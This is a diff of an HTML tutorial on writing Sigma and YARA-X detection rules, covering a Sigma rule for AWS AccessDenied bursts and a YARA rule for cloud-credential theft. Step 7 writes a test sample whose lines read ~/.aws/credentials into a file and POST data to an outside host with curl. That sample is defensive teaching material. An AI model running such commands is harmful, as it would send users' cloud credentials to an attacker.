@@ -388,10 +388,10 @@
             <p>Intermediate here means you have used a SIEM or some log search language, can install Python packages and run commands in a terminal, and can read YAML, the indented <code>name: value</code> format Sigma rules are written in. If log searches are new to you, the <a href="splunk-spl.html">Splunk SPL</a> guide teaches, at beginner level, the language step 4 converts a Sigma rule into. Regular expressions appear in both halves, and <a href="regex-for-security.html">regex for security</a> covers them; <a href="../detection-engineering.html">detection engineering</a> explains where rules like these fit in a security team's work.</p>
             <p>Everything on this page runs on your own computer, and you do not need a SIEM: <code>sigma-cli</code> checks and converts Sigma rules without one, and YARA-X scans local files. Steps 1 and 6 install the two tools.</p>
             <p>The page has two halves, and the YARA steps use nothing from the Sigma steps, so you can start with whichever you need. In the <a href="#sigma">Sigma half</a>, steps 1 to 5 install <code>sigma-cli</code>, write one rule, check it, convert it into a Splunk search, and then add a correlation rule, a second rule that counts the first one's matches over a time window. In the <a href="#yara">YARA half</a>, steps 6 to 10 install YARA-X, write a rule and two small files to test it on, scan both, look at other kinds of condition, and format rules for review. The <a href="#exercises">exercises</a> cover both halves, with each answer hidden until you open "Show the answer".</p>
-            <p>Each input block has a label in its header, and every block has a copy button. A block labelled BASH goes into your terminal. zsh, the default shell on macOS, rejects a <code>#</code> comment pasted at its prompt: it runs a comment line as a command and passes a trailing comment to the command as extra arguments. Before pasting, run <code>setopt interactivecomments</code> once in each new terminal, or use bash. A block labelled YAML is a Sigma rule or part of one: step 2 says what to name the file, and step 5 adds to the same file. The blocks labelled YARA, in step 9 and the exercises, are rules to read and try; the rule you scan with is written by step 7. The two unlabelled blocks show what a command printed: the Splunk search in step 4 and the scan in step 8. Step 7's block starts with <code>cat &gt; demo.yar &lt;&lt;'EOF'</code>, which writes every line down to the one that says only <code>EOF</code> into a file called <code>demo.yar</code>, and its last two lines then make the two test files. Paste the whole block at once, the <code>EOF</code> line included.</p>
+            <p>Each input block has a label in its header, and every block has a copy button. A block labelled BASH goes into your terminal. A block labelled YAML is a Sigma rule or part of one: step 2 says what to name the file, and step 5 adds to the same file. The blocks labelled YARA, in step 9 and the exercises, are rules to read and try; the rule you scan with is written by step 7. The two unlabelled blocks show what a command printed: the Splunk search in step 4 and the scan in step 8. Step 7's block starts with <code>cat &gt; demo.yar &lt;&lt;'EOF'</code>, which writes every line down to the one that says only <code>EOF</code> into a file called <code>demo.yar</code>, and its last two lines then make the two test files. Paste the whole block at once, the <code>EOF</code> line included.</p>
             <p>Your output should match the page if your versions match. The box at the top says the Sigma and YARA commands were run as printed, with sigma-cli 3.1.0 (pySigma 1.5.0, Splunk backend 2.1.0) and yara-x-cli 1.20.0 on an Apple silicon Mac, and the outputs shown are what they printed; other versions may print something different. The install commands in steps 1 and 6 were not re-run, and the correlation rule in step 5 was converted for Splunk only.</p>
             <p>Some parts can wait for a second reading: the list of value modifiers at the end of step 2, the correlation types after step 5's rule, and the two rules in step 9.</p>
-            <p>If a command fails or prints something else, check that you are in the folder that holds the files (step 1 makes <code>~/detect-lab</code> and moves into it), that the rule file still has the name step 2 gave it (step 3 has you rename it as a test, and step 4 uses the original name), that the Splunk backend from step 1 is installed, and that you typed <code>yr</code>, not <code>yara</code>. Two failures are on purpose: the high-severity issue after the rename in step 3, and the first <code>sigma convert</code> in step 4.</p>
+            <p>If a command fails or prints something else, check that you are in the folder that holds the files (step 1 makes <code>~/detect-lab</code> and moves into it), that the rule file still has the name step 2 gave it (step 3 has you rename it as a test and then rename it back, because step 4 uses the original name), that the Splunk backend from step 1 is installed, and that you typed <code>yr</code>, not <code>yara</code>. Two failures are on purpose: the high-severity issue after the rename in step 3, and the first <code>sigma convert</code> in step 4.</p>
         </section>
 
         <section id="sigma">
@@ -399,13 +399,13 @@
             <p>Suppose your team wants an alert when one source gets AccessDenied errors from AWS again and again, a common sign that someone is trying out a leaked key. Written as a Splunk search, the detection runs only in Splunk, and a team on another SIEM would have to rewrite it. Sigma lets you write it once, as a YAML file, and convert it for each SIEM. Steps 1 to 5 build that one rule: install the tools, write the rule, check it, convert it, and then make it count a burst rather than fire on every error. Read <a href="#step-convert">step 4</a> most carefully: a Sigma rule's field names are Sigma's, and a processing pipeline has to map them onto your SIEM's.</p>
 
             <h3>1. Install the toolchain</h3>
+            <p>Make a folder for the lab, move into it, and install <code>sigma-cli</code> with pip. If you use pipx, <code>pipx install sigma-cli</code> works in place of the pip line.</p>
 <div class="code-block" data-lang="bash"><pre>mkdir -p ~/detect-lab &amp;&amp; cd ~/detect-lab
 
-python3 -m pip install sigma-cli     # or: pipx install sigma-cli
-sigma version
-
-# Backends are plugins, installed separately. See what exists first.
-sigma plugin list
+python3 -m pip install sigma-cli
+sigma version</pre></div>
+            <p>Backends are plugins, installed separately. See what exists first, then install the Splunk backend:</p>
+<div class="code-block" data-lang="bash"><pre>sigma plugin list
 sigma plugin install splunk</pre></div>
 
             <h3>2. The anatomy of a rule</h3>
@@ -447,7 +447,12 @@ level: medium                                 # informational | low | medium | h
 
             <h3>3. Validate before you convert</h3>
 <div class="code-block" data-lang="bash"><pre>sigma check aws_cloudtrail_access_denied_burst.yml</pre></div>
-            <p>Expect <code>Found 0 errors, 0 condition errors and 0 issues</code>. Now rename the file to something short like <code>rule.yml</code> and run it again: you get a high-severity <code>FilenameLengthIssue</code>. That check exists because SigmaHQ rules live in a flat directory of thousands, where a descriptive filename is the only navigation there is. Put <code>sigma check</code> in <a class="glossary-link" href="../glossary.html#term-ci-cd">CI</a> over your rule directory and this class of drift never accumulates.</p>
+            <p>Expect <code>Found 0 errors, 0 condition errors and 0 issues</code>. Now rename the file to something short like <code>rule.yml</code> and check it again:</p>
+<div class="code-block" data-lang="bash"><pre>mv aws_cloudtrail_access_denied_burst.yml rule.yml
+sigma check rule.yml</pre></div>
+            <p>This time you get a high-severity <code>FilenameLengthIssue</code>. Rename the file back before step 4, which uses the original name:</p>
+<div class="code-block" data-lang="bash"><pre>mv rule.yml aws_cloudtrail_access_denied_burst.yml</pre></div>
+            <p>The filename check exists because SigmaHQ rules live in a flat directory of thousands, where a descriptive filename is the only navigation there is. Put <code>sigma check --fail-on-issues</code> in <a class="glossary-link" href="../glossary.html#term-ci-cd">CI</a> over your rule directory and this class of drift never accumulates. The flag matters: by default <code>sigma check</code> reports issues and still exits 0, so a pipeline would pass.</p>
 
             <h3 id="step-convert">4. Convert it, and meet the pipeline requirement</h3>
 <div class="code-block" data-lang="bash"><pre>sigma convert -t splunk aws_cloudtrail_access_denied_burst.yml</pre></div>
@@ -455,10 +460,10 @@ level: medium                                 # informational | low | medium | h
             <div class="highlight-box">
             <p><strong>A Sigma rule's field names are Sigma's names, not your SIEM's.</strong> A <em>processing pipeline</em> maps them onto whatever your data actually looks like after ingestion, and different ingestion paths for the same source produce different field names. Convert without a pipeline and you get a syntactically valid query referencing fields that do not exist in your index. It runs. It returns zero results. It looks like a quiet environment.</p>
             </div>
-<div class="code-block" data-lang="bash"><pre>sigma list pipelines splunk        # what mappings ship with this backend
-
-# Now, knowing what you are giving up:
-sigma convert -t splunk --without-pipeline aws_cloudtrail_access_denied_burst.yml</pre></div>
+            <p>List the mappings that ship with the Splunk backend:</p>
+<div class="code-block" data-lang="bash"><pre>sigma list pipelines splunk</pre></div>
+            <p>Now, knowing what you are giving up, convert without one:</p>
+<div class="code-block" data-lang="bash"><pre>sigma convert -t splunk --without-pipeline aws_cloudtrail_access_denied_burst.yml</pre></div>
             <p>Which produces:</p>
 <div class="code-block" data-lang="text"><pre>errorCode="AccessDenied" NOT userIdentity.arn="arn:aws:sts::111122223333:assumed-role/config-recorder/*"</pre></div>
             <p>Read what the compiler did. <code>|startswith</code> became a trailing <code>*</code>, and <code>not</code> became <code>NOT</code>. That is the whole value proposition: the same rule targets Elastic, Sentinel, QRadar, Carbon Black, or SentinelOne by changing one flag, and each backend knows its own dialect's quirks.</p>
@@ -487,7 +492,8 @@ level: high</pre></div>
             <p>Now the second question from the start of the page: is this file the bad one? Steps 6 to 10 install YARA-X, write a rule for a script that reads cloud credentials and sends them off over the internet, test it on one file it must match and one it must not, then look at other conditions and at keeping rules in git.</p>
 
             <h3>6. Install YARA-X, not YARA</h3>
-<div class="code-block" data-lang="bash"><pre>brew install yara-x      # or: cargo install yara-x-cli
+            <p>Install it with Homebrew, or with <code>cargo install yara-x-cli</code> in place of the first line, and check the version:</p>
+<div class="code-block" data-lang="bash"><pre>brew install yara-x
 yr --version</pre></div>
             <p>YARA-X is the Rust rewrite from VirusTotal. Version 1.0 went stable in June 2025, VirusTotal runs it in production for Livehunt and Retrohunt, and the original YARA 4.x line is in maintenance mode receiving bug fixes only. The command is <code>yr</code>, not <code>yara</code>, and the subcommands are <code>scan</code>, <code>compile</code>, <code>fmt</code>, <code>dump</code>, <code>deps</code>, and <code>fix</code>.</p>
             <p>Rules are broadly compatible in the direction that matters: existing YARA rules generally work on YARA-X. Do not assume the reverse.</p>
@@ -526,11 +532,12 @@ printf '#!/bin/sh\ncat ~/.aws/credentials &gt; /tmp/loot\ncurl -X POST https://e
 printf 'just some ordinary text with the word curl in it\n' &gt; benign.txt</pre></div>
 
             <h3>8. Compile, scan, and read the evidence</h3>
-<div class="code-block" data-lang="bash"><pre>yr compile demo.yar -o /dev/null     # syntax check without scanning anything
-
-yr scan demo.yar sample.sh           # expect: the rule name and the filename
-yr scan demo.yar benign.txt          # expect: nothing at all</pre></div>
-            <p>Run both. <code>benign.txt</code> contains the word <code>curl</code> and correctly does not match, because the condition requires a credential indicator <em>and</em> an <a class="glossary-link" href="../glossary.html#term-exfiltration">exfiltration</a> indicator. That negative case is not a formality: it is the only thing distinguishing a working rule from one that matches half your filesystem.</p>
+            <p>Compiling the rule with its output sent to <code>/dev/null</code> checks the syntax without scanning anything:</p>
+<div class="code-block" data-lang="bash"><pre>yr compile demo.yar -o /dev/null</pre></div>
+            <p>Then scan the two test files:</p>
+<div class="code-block" data-lang="bash"><pre>yr scan demo.yar sample.sh
+yr scan demo.yar benign.txt</pre></div>
+            <p>Run both. The first prints the rule name and the filename, <code>Suspicious_Cloud_Credential_Theft sample.sh</code>, and the second prints nothing at all. <code>benign.txt</code> contains the word <code>curl</code> and correctly does not match, because the condition requires a credential indicator <em>and</em> an <a class="glossary-link" href="../glossary.html#term-exfiltration">exfiltration</a> indicator. That negative case is not a formality: it is the only thing distinguishing a working rule from one that matches half your filesystem.</p>
 <div class="code-block" data-lang="bash"><pre>yr scan -s demo.yar sample.sh</pre></div>
             <p><code>-s</code> prints every matched string with its offset, length, identifier, and the actual bytes:</p>
 <div class="code-block" data-lang="text"><pre>Suspicious_Cloud_Credential_Theft sample.sh
@@ -559,8 +566,9 @@ rule Is_Windows_PE
             <p>Anchoring on structure rather than content is what makes a rule fast. YARA scans everything you point it at, so a rule that can rule out a file in two bytes is worth far more than one that has to search the whole thing. The <code>pe</code>, <code>elf</code>, <code>math</code>, and <code>hash</code> modules go further, exposing parsed structure such as imports, sections, and entropy.</p>
 
             <h3>10. Keep rules in git like code</h3>
-<div class="code-block" data-lang="bash"><pre>yr fmt demo.yar             # rewrite in canonical style
-yr fmt --check demo.yar     # exit 1 if it WOULD be rewritten - a CI gate</pre></div>
+            <p><code>yr fmt</code> rewrites a rule file in canonical style. With <code>--check</code> it changes nothing and exits 1 if the file would be rewritten, which makes it a CI gate.</p>
+<div class="code-block" data-lang="bash"><pre>yr fmt demo.yar
+yr fmt --check demo.yar</pre></div>
             <p><code>yr fmt --check</code> and <code>sigma check</code> are the same idea applied to the two formats, and both belong in the same pipeline as the rules themselves.</p>
         </section>
 
